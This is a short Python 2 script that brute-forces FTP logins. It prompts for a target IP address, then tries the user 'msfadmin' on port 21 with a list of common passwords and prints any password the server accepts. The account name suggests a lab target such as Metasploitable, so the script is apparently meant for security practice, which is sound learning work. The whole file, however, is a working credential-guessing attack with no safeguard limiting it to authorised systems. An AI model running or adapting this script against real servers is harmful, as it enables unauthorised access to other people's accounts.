#!/usr/bin/python
import socket
import re
import sys
ipaddress = raw_input("Enter IP Address to brute force ftp: ")
def connect (username, password):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print "[*] Trying "+ username + ":" + password
    s.connect((ipaddress, 21))
    data = s.recv(1024)
    s.send('USER ' + username + '\r\n')
    data = s.recv(1024)
    s.send('PASS ' + password + '\r\n')
    data = s.recv (3)
    s.send('QUIT\r\n')
    s.close()
    return data
username = 'msfadmin'
passwords =["password", "12345", "root", "administrator", "admin", "msfadmin"]
for password in passwords:
    attempt = connect(username, password)
    if attempt=="230":
        print "[*] Password found: " + password

#mchristinapadilla